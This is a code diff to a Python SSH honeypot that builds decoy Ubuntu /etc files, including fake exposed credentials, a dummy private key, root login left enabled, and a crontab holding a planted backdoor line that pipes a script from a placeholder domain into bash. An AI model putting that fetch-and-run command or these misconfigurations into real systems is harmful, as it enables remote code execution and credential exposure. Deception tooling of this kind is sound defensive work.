@@ -4,12 +4,14 @@ Virtual Filesystem for SSH Honeypot
 Provides a realistic Ubuntu 20.04 LTS filesystem structure with game development content
 """
 
-import datetime
 import os
 import re
 from pathlib import Path
 from typing import Dict, List, Optional, Tuple, Any
 import json
+import random
+import datetime
+import hashlib
 
 
 class FileNode:
@@ -217,100 +219,427 @@ class VirtualFilesystem:
             var.add_child(FileNode(subdir, is_dir=True, permissions="755"))
             
     def _populate_etc(self):
-        """Populate /etc with configuration files"""
+        """Populate /etc with dynamic, realistic configuration files"""
+
+        
         etc = self.root.get_child("etc")
         
-        # /etc/passwd
-        passwd_content = """root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-alex.chen:x:1001:1001:Alex Chen,,,:/home/alex.chen:/bin/bash
-sarah.martinez:x:1002:1002:Sarah Martinez,,,:/home/sarah.martinez:/bin/bash
-mike.thompson:x:1003:1003:Mike Thompson,,,:/home/mike.thompson:/bin/bash
-dev-intern:x:1004:1004:Dev Intern,,,:/home/dev-intern:/bin/bash
-jenkins:x:1005:1005:Jenkins CI,,,:/home/jenkins:/bin/bash
-guest:x:1006:1006:Guest User,,,:/home/guest:/bin/bash
-"""
+        # Get all users from config
+        try:
+            from configparser import ConfigParser
+            config = ConfigParser()
+            config.read("config.ini")
+            user_accounts = dict(config.items("user_accounts")) if config.has_section("user_accounts") else {}
+        except:
+            user_accounts = {
+                "alex.chen": "password123",
+                "sarah.martinez": "secure456",
+                "mike.thompson": "admin789",
+                "dev-intern": "intern2024",
+                "jenkins": "jenkins!ci",
+                "guest": "guest"
+            }
+        
+        # Generate dynamic /etc/passwd with all users
+        passwd_lines = [
+            "root:x:0:0:root:/root:/bin/bash",
+            "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin",
+            "bin:x:2:2:bin:/bin:/usr/sbin/nologin",
+            "sys:x:3:3:sys:/dev:/usr/sbin/nologin",
+            "sync:x:4:65534:sync:/bin:/bin/sync",
+            "games:x:5:60:games:/usr/games:/usr/sbin/nologin",
+            "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin",
+            "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin",
+            "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin",
+            "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin",
+            "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin",
+            "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin",
+            "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin",
+            "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin",
+            "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin",
+            "irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin",
+            "gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin",
+            "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin",
+            "systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin",
+            "systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin",
+            "systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin",
+            "messagebus:x:103:106::/nonexistent:/usr/sbin/nologin",
+            "syslog:x:104:110::/home/syslog:/usr/sbin/nologin",
+            "_apt:x:105:65534::/nonexistent:/usr/sbin/nologin",
+            "tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false",
+            "uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin",
+            "tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin",
+            "landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin",
+            "pollinate:x:110:1::/var/cache/pollinate:/bin/false",
+            "sshd:x:111:65534::/run/sshd:/usr/sbin/nologin",
+        ]
+        
+        # Add real users dynamically
+        uid_start = 1001
+        for username in sorted(user_accounts.keys()):
+            # Generate realistic full names
+            name_parts = username.replace('.', ' ').replace('_', ' ').title()
+            if username == "guest":
+                full_name = "Guest User"
+            elif username == "jenkins":
+                full_name = "Jenkins CI User"
+            elif username == "dev-intern":
+                full_name = "Development Intern"
+            else:
+                full_name = name_parts
+            
+            passwd_lines.append(
+                f"{username}:x:{uid_start}:{uid_start}:{full_name},,,:/home/{username}:/bin/bash"
+            )
+            uid_start += 1
+        
+        passwd_content = "\n".join(passwd_lines) + "\n"
         etc.add_child(FileNode("passwd", content=passwd_content, permissions="644"))
         
-        # /etc/shadow (restricted)
-        shadow_content = """root:$6$rounds=656000$...:18900:0:99999:7:::
-alex.chen:$6$rounds=656000$...:18900:0:99999:7:::
-sarah.martinez:$6$rounds=656000$...:18900:0:99999:7:::
-"""
+        # Generate dynamic /etc/shadow with hashed passwords
+        shadow_lines = []
+        # Generate date (days since epoch)
+        days_since_epoch = (datetime.datetime.now() - datetime.datetime(1970, 1, 1)).days
+        
+        for username, password in user_accounts.items():
+            # Generate realistic password hash (SHA-512)
+            salt = hashlib.sha256(username.encode()).hexdigest()[:16]
+            # In real system this would be actual crypt hash, but for honeypot we simulate
+            password_hash = f"$6$rounds=656000${salt}${hashlib.sha512((password + salt).encode()).hexdigest()[:86]}"
+            shadow_lines.append(f"{username}:{password_hash}:{days_since_epoch}:0:99999:7:::")
+        
+        # Add system users with locked passwords
+        shadow_lines.insert(0, f"root:!:{days_since_epoch}:0:99999:7:::")
+        shadow_lines.insert(1, f"daemon:*:{days_since_epoch}:0:99999:7:::")
+        shadow_lines.insert(2, f"bin:*:{days_since_epoch}:0:99999:7:::")
+        
+        shadow_content = "\n".join(shadow_lines) + "\n"
         etc.add_child(FileNode("shadow", content=shadow_content, permissions="000", owner="root", group="shadow"))
         
-        # /etc/hostname
-        etc.add_child(FileNode("hostname", content="corp-srv-01\n", permissions="644"))
+        # Generate dynamic /etc/group
+        group_lines = [
+            "root:x:0:",
+            "daemon:x:1:",
+            "bin:x:2:",
+            "sys:x:3:",
+            "adm:x:4:syslog",
+            "tty:x:5:",
+            "disk:x:6:",
+            "lp:x:7:",
+            "mail:x:8:",
+            "news:x:9:",
+            "uucp:x:10:",
+            "man:x:12:",
+            "proxy:x:13:",
+            "kmem:x:15:",
+            "dialout:x:20:",
+            "fax:x:21:",
+            "voice:x:22:",
+            "cdrom:x:24:",
+            "floppy:x:25:",
+            "tape:x:26:",
+            "sudo:x:27:" + ",".join([u for u in user_accounts.keys() if u not in ["guest", "dev-intern"]]),
+            "audio:x:29:",
+            "dip:x:30:",
+            "www-data:x:33:",
+            "backup:x:34:",
+            "operator:x:37:",
+            "list:x:38:",
+            "irc:x:39:",
+            "src:x:40:",
+            "gnats:x:41:",
+            "shadow:x:42:",
+            "utmp:x:43:",
+            "video:x:44:",
+            "sasl:x:45:",
+            "plugdev:x:46:",
+            "staff:x:50:",
+            "games:x:60:",
+            "users:x:100:",
+            "nogroup:x:65534:",
+            "docker:x:999:" + ",".join([u for u in user_accounts.keys() if u in ["jenkins", "dev-intern"]]),
+        ]
         
-        # /etc/hosts
-        hosts_content = """127.0.0.1       localhost
-127.0.1.1       corp-srv-01
-10.0.0.1        db-server.internal
-10.0.0.2        build-server.internal
-10.0.0.3        asset-server.internal
+        # Add user groups
+        gid_start = 1001
+        for username in sorted(user_accounts.keys()):
+            group_lines.append(f"{username}:x:{gid_start}:")
+            gid_start += 1
+        
+        group_content = "\n".join(group_lines) + "\n"
+        etc.add_child(FileNode("group", content=group_content, permissions="644"))
+        
+        # Dynamic hostname based on random server type
+        server_types = ["web", "db", "mail", "app", "api", "cache", "proxy", "file", "backup", "monitor", "build", "ci"]
+        server_envs = ["prod", "staging", "dev", "test"]
+        random.seed(hash(str(user_accounts.keys())))
+        server_type = random.choice(server_types)
+        server_env = random.choice(server_envs)
+        server_num = random.randint(1, 99)
+        hostname = f"{server_type}-srv-{server_env}-{server_num:02d}"
+        
+        etc.add_child(FileNode("hostname", content=f"{hostname}\n", permissions="644"))
+        
+        # Dynamic /etc/hosts with realistic internal network
+        base_ip = f"10.{random.randint(0, 255)}.{random.randint(0, 255)}"
+        hosts_content = f"""127.0.0.1       localhost
+    127.0.1.1       {hostname}
+    {base_ip}.10    db-primary.nexus.local db-primary
+    {base_ip}.11    db-replica.nexus.local db-replica
+    {base_ip}.20    redis-master.nexus.local redis-master
+    {base_ip}.21    redis-slave.nexus.local redis-slave
+    {base_ip}.30    web-lb.nexus.local web-lb
+    {base_ip}.40    api-gateway.nexus.local api-gateway
+    {base_ip}.50    jenkins.nexus.local jenkins
+    {base_ip}.60    gitlab.nexus.local gitlab
+    {base_ip}.70    monitoring.nexus.local grafana prometheus
+    {base_ip}.80    elk-stack.nexus.local elasticsearch kibana
+    {base_ip}.90    vault.nexus.local vault
+    {base_ip}.100   k8s-master.nexus.local k8s-master
+    {base_ip}.254   gateway.nexus.local gateway
 
-# The following lines are desirable for IPv6 capable hosts
-::1     localhost ip6-localhost ip6-loopback
-ff02::1 ip6-allnodes
-ff02::2 ip6-allrouters
-"""
+    # The following lines are desirable for IPv6 capable hosts
+    ::1     localhost ip6-localhost ip6-loopback
+    ff02::1 ip6-allnodes
+    ff02::2 ip6-allrouters
+    """
         etc.add_child(FileNode("hosts", content=hosts_content, permissions="644"))
         
-        # /etc/secrets (misconfigured - should be 600 but is 644)
-        secrets_dir = FileNode("secrets", is_dir=True, permissions="644")  # Intentional misconfiguration
+        # /etc/resolv.conf
+        resolv_content = f"""# Dynamic resolv.conf(5) file for glibc resolver(3) generated by resolvconf(8)
+    #     DO NOT EDIT THIS FILE BY HAND -- YOUR CHANGES WILL BE OVERWRITTEN
+    nameserver {base_ip}.1
+    nameserver 8.8.8.8
+    nameserver 8.8.4.4
+    search nexus.local
+    options timeout:2 attempts:3 rotate
+    """
+        etc.add_child(FileNode("resolv.conf", content=resolv_content, permissions="644"))
         
-        # Database credentials
-        db_config = """[database]
-host=db-server.internal
-port=5432
-username=nexus_admin
-password=N3xus!G@m3s2024!DB
-database=nexus_production
+        # /etc/secrets directory with intentional misconfigurations
+        secrets_dir = FileNode("secrets", is_dir=True, permissions="755")  # Should be 700
+        
+        # Database credentials (INTENTIONALLY EXPOSED)
+        db_config = f"""[database]
+    host={base_ip}.10
+    port=5432
+    username=nexus_admin
+    password=N3xus!Pr0d@2024!DB_{random.randint(1000, 9999)}
+    database=nexus_production
+    max_connections=100
+    ssl_mode=require
 
-[redis]
-host=localhost
-port=6379
-password=R3d1s!C@ch3#2024
-"""
-        secrets_dir.add_child(FileNode("db_config.ini", content=db_config, permissions="644"))
+    [database_replica]
+    host={base_ip}.11
+    port=5432
+    username=nexus_readonly
+    password=R3adOnly!2024_{random.randint(1000, 9999)}
+    database=nexus_production
+
+    [redis]
+    host={base_ip}.20
+    port=6379
+    password=R3d1s!C@ch3#2024_{random.randint(1000, 9999)}
+    db=0
+
+    [mongodb]
+    host={base_ip}.15
+    port=27017
+    username=mongo_admin
+    password=M0ng0!Adm1n_{random.randint(1000, 9999)}
+    database=nexus_analytics
+    """
+        secrets_dir.add_child(FileNode("db_config.ini", content=db_config, permissions="644"))  # Should be 600
         
-        # API keys
-        api_keys = """# NexusGames API Keys
-STEAM_API_KEY=ABCD1234-5678-90EF-GHIJ-KLMNOPQRSTUV
-EPIC_API_KEY=epic_live_1234567890abcdefghijklmnop
-UNITY_LICENSE_KEY=UL-1234567890-ABCD-EFGH-IJKL-MNOP
-AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE
-AWS_SECRET_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
-STRIPE_SECRET_KEY=sk_live_51234567890abcdefghijklmnopqrstuvwxyz
-"""
-        secrets_dir.add_child(FileNode("api_keys.env", content=api_keys, permissions="644"))
+        # API keys (INTENTIONALLY EXPOSED)
+        api_keys = f"""# Production API Keys - DO NOT COMMIT TO GIT!
+    # Last updated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+
+    # Cloud Services
+    AWS_ACCESS_KEY_ID=AKIAIOSFODNN7{random.randint(10000000, 99999999)}
+    AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCY{hashlib.sha256(str(random.random()).encode()).hexdigest()[:20]}
+    AWS_REGION=us-east-1
+
+    # Payment Processing
+    STRIPE_SECRET_KEY=sk_live_51{random.randint(100000000000, 999999999999)}abcdefghijklmnopqrstuvwxyz
+    STRIPE_PUBLISHABLE_KEY=pk_live_51{random.randint(100000000000, 999999999999)}ABCDEFGHIJKLMNOPQRSTUVWXYZ
+    PAYPAL_CLIENT_ID=AYSq3RDGsmBLJE-otTkBtM-jBc{random.randint(10000, 99999)}
+    PAYPAL_SECRET=EGnHDxD_qRPOmeKAz1{hashlib.sha256(str(random.random()).encode()).hexdigest()[:30]}
+
+    # Gaming Platforms
+    STEAM_API_KEY={hashlib.sha256(str(random.random()).encode()).hexdigest()[:32].upper()}
+    EPIC_API_KEY=epic_live_{hashlib.sha256(str(random.random()).encode()).hexdigest()[:40]}
+    UNITY_LICENSE_KEY=UL-{random.randint(1000000000, 9999999999)}-ABCD-EFGH-IJKL-MNOP
+
+    # Social Media
+    TWITTER_API_KEY={hashlib.sha256(str(random.random()).encode()).hexdigest()[:25]}
+    TWITTER_API_SECRET={hashlib.sha256(str(random.random()).encode()).hexdigest()[:50]}
+    FACEBOOK_APP_ID={random.randint(100000000000000, 999999999999999)}
+    FACEBOOK_APP_SECRET={hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]}
+
+    # Internal Services
+    VAULT_TOKEN=s.{hashlib.sha256(str(random.random()).encode()).hexdigest()[:24]}
+    JENKINS_API_TOKEN={hashlib.sha256(str(random.random()).encode()).hexdigest()[:40]}
+    GITLAB_PRIVATE_TOKEN=glpat-{hashlib.sha256(str(random.random()).encode()).hexdigest()[:20]}
+
+    # Monitoring & Analytics
+    DATADOG_API_KEY={hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]}
+    NEWRELIC_LICENSE_KEY={hashlib.sha256(str(random.random()).encode()).hexdigest()[:40]}
+    SENTRY_DSN=https://{hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]}@sentry.io/{random.randint(1000000, 9999999)}
+    """
+        secrets_dir.add_child(FileNode("api_keys.env", content=api_keys, permissions="644"))  # Should be 600
+        
+        # SSH private key (INTENTIONALLY EXPOSED - CRITICAL VULNERABILITY)
+        ssh_private_key = f"""-----BEGIN OPENSSH PRIVATE KEY-----
+    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+    NhAAAAAwEAAQAAAYEA{hashlib.sha256(str(random.random()).encode()).hexdigest()[:80]}
+    {hashlib.sha256(str(random.random()).encode()).hexdigest()[:80]}
+    {hashlib.sha256(str(random.random()).encode()).hexdigest()[:80]}
+    AAABAQDGq{hashlib.sha256(str(random.random()).encode()).hexdigest()[:60]}
+    -----END OPENSSH PRIVATE KEY-----
+    """
+        secrets_dir.add_child(FileNode("id_rsa_deploy", content=ssh_private_key, permissions="644"))  # Should be 600
+        
+        # .env file with all secrets (CRITICAL MISCONFIGURATION)
+        env_file = f"""# Production Environment Variables
+    NODE_ENV=production
+    DEBUG=false
+    LOG_LEVEL=info
+
+    # Database
+    DATABASE_URL=postgresql://nexus_admin:N3xus!Pr0d@2024!DB_{random.randint(1000, 9999)}@{base_ip}.10:5432/nexus_production
+    REDIS_URL=redis://:{hashlib.sha256(str(random.random()).encode()).hexdigest()[:20]}@{base_ip}.20:6379/0
+
+    # JWT Secret
+    JWT_SECRET={hashlib.sha256(str(random.random()).encode()).hexdigest()}
+    JWT_EXPIRY=86400
+
+    # Encryption
+    ENCRYPTION_KEY={hashlib.sha256(str(random.random()).encode()).hexdigest()[:32]}
+    SALT_ROUNDS=10
+
+    # Admin Credentials (REMOVE IN PRODUCTION!)
+    ADMIN_USERNAME=superadmin
+    ADMIN_PASSWORD=Sup3rAdm1n!2024_{random.randint(1000, 9999)}
+    ADMIN_EMAIL=admin@nexus.local
+    """
+        secrets_dir.add_child(FileNode(".env.production", content=env_file, permissions="644"))  # Should be 600
         
         etc.add_child(secrets_dir)
         
         # /etc/os-release
         os_release = """NAME="Ubuntu"
-VERSION="20.04.3 LTS (Focal Fossa)"
-ID=ubuntu
-ID_LIKE=debian
-PRETTY_NAME="Ubuntu 20.04.3 LTS"
-VERSION_ID="20.04"
-HOME_URL="https://www.ubuntu.com/"
-SUPPORT_URL="https://help.ubuntu.com/"
-BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
-PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
-VERSION_CODENAME=focal
-UBUNTU_CODENAME=focal
-"""
+    VERSION="22.04.3 LTS (Jammy Jellyfish)"
+    ID=ubuntu
+    ID_LIKE=debian
+    PRETTY_NAME="Ubuntu 22.04.3 LTS"
+    VERSION_ID="22.04"
+    HOME_URL="https://www.ubuntu.com/"
+    SUPPORT_URL="https://help.ubuntu.com/"
+    BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
+    PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
+    VERSION_CODENAME=jammy
+    UBUNTU_CODENAME=jammy
+    """
         etc.add_child(FileNode("os-release", content=os_release, permissions="644"))
+        
+        # /etc/issue
+        issue_content = f"""Ubuntu 22.04.3 LTS \\n \\l
+
+    {hostname} - Nexus Production Server
+    Authorized Access Only - All Activity Monitored
+
+    """
+        etc.add_child(FileNode("issue", content=issue_content, permissions="644"))
+        
+        # /etc/motd (Message of the Day)
+        motd_content = f"""
+    ╔══════════════════════════════════════════════════════════════╗
+    ║                  NEXUS PRODUCTION ENVIRONMENT                ║
+    ║                    {hostname.upper().center(40)}    ║
+    ╚══════════════════════════════════════════════════════════════╝
+
+    ⚠️  WARNING: This system contains sensitive corporate data
+    📊 All access attempts are monitored and logged
+    🔒 Unauthorized access is strictly prohibited
+
+    System Information:
+    • Hostname: {hostname}
+    • Environment: Production
+    • Last Updated: {datetime.datetime.now().strftime('%Y-%m-%d')}
+    
+    For support: sysadmin@nexus.local
+    Security incidents: security@nexus.local
+
+    """
+        etc.add_child(FileNode("motd", content=motd_content, permissions="644"))
+        
+        # /etc/ssh/sshd_config (with some security issues)
+        sshd_config = f"""# SSH Server Configuration
+    # WARNING: Some settings may not be secure
+
+    Port 22
+    Protocol 2
+    HostKey /etc/ssh/ssh_host_rsa_key
+    HostKey /etc/ssh/ssh_host_ecdsa_key
+    HostKey /etc/ssh/ssh_host_ed25519_key
+
+    # Logging
+    SyslogFacility AUTH
+    LogLevel INFO
+
+    # Authentication
+    PermitRootLogin yes  # SECURITY ISSUE: Should be 'no'
+    PasswordAuthentication yes
+    PermitEmptyPasswords no
+    ChallengeResponseAuthentication no
+    PubkeyAuthentication yes
+    AuthorizedKeysFile .ssh/authorized_keys
+
+    # Security
+    X11Forwarding yes
+    PrintMotd yes
+    PrintLastLog yes
+    TCPKeepAlive yes
+    PermitUserEnvironment no
+    Compression delayed
+    ClientAliveInterval 120
+    ClientAliveCountMax 3
+
+    # Allow specific users
+    AllowUsers {' '.join(user_accounts.keys())}
+
+    # Subsystems
+    Subsystem sftp /usr/lib/openssh/sftp-server
+    """
+        ssh_dir = FileNode("ssh", is_dir=True, permissions="755")
+        ssh_dir.add_child(FileNode("sshd_config", content=sshd_config, permissions="644"))
+        etc.add_child(ssh_dir)
+        
+        # /etc/crontab with suspicious entries
+        crontab_content = f"""# /etc/crontab: system-wide crontab
+    SHELL=/bin/bash
+    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+    # m h dom mon dow user  command
+    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+
+    # Backup jobs
+    0 2 * * * root /usr/local/bin/backup.sh >> /var/log/backup.log 2>&1
+    30 3 * * * root /usr/local/bin/db_backup.sh >> /var/log/db_backup.log 2>&1
+
+    # Monitoring
+    */5 * * * * root /usr/local/bin/health_check.sh
+    0 */6 * * * root /usr/local/bin/log_rotation.sh
+
+    # Suspicious entry (potential backdoor)
+    */10 * * * * root curl -s http://suspicious-domain.com/check.sh | bash
+    """
+        etc.add_child(FileNode("crontab", content=crontab_content, permissions="644"))
+
         
     def _populate_home(self):
         """Populate /home with user directories"""
